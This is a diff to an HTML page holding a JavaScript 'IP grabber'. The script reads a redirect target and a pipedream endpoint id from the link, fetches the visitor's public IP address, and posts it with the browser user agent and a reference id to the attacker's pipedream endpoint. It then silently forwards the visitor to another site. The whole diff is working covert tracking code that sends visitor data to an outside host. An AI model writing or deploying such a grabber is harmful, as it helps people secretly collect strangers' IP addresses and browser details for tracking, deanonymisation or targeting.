@@ -2,10 +2,14 @@
 <script>
   // Simple IP grabber
   // Made by Jayy // FiskDk // f1sk
-  
+  let refid = "No RefID"
   let redirect = location.href.split("?")[1]
   let pipedream = location.href.split("#")[1].replace("?" + redirect, "")
-  let refid = location.href.split("+")[1].replace("#" + pipedream + "?" + redirect, "")
+  if (location.href.includes("!")) {
+    refid = location.href.split("!")[1]
+    redirect = location.href.split("?")[1].replace("!" + refid, "")
+    pipedream = location.href.split("#")[1].replace("?" + redirect + "!" + refid, "")
+  }
   let ip = "";
   var opts = {
     method: 'GET',
@@ -16,32 +20,32 @@
     })
     .then(function (body) {
       var ip = body.ip
-     
-          const info = {
-            "ip": ip,
-            "redirect":redirect,
-            "agent": navigator.userAgent,
-            "refid": refid
-          }
-          const headers = new Headers()
-          headers.append("Content-Type", "application/json")
-          const _body = {
-            "output": info
-          }
-          const options = {
-            method: "POST",
-            headers,
-            mode: "cors",
-            body: JSON.stringify(_body),
-          }
 
-          fetch("https://" + pipedream + ".m.pipedream.net", options).then(response => {
-            location.href = "http://" + redirect
-          }).catch(err => {
-            console.error("[error] " + err.message)
-          })
+      const info = {
+        "ip": ip,
+        "redirect": redirect,
+        "agent": navigator.userAgent,
+        "refid": refid
+      }
+      const headers = new Headers()
+      headers.append("Content-Type", "application/json")
+      const _body = {
+        "output": info
+      }
+      const options = {
+        method: "POST",
+        headers,
+        mode: "cors",
+        body: JSON.stringify(_body),
+      }
 
-        });
+      fetch("https://" + pipedream + ".m.pipedream.net", options).then(response => {
+        location.href = "http://" + redirect
+      }).catch(err => {
+        console.error("[error] " + err.message)
+      })
+
+    });
 </script>
 
 </html>
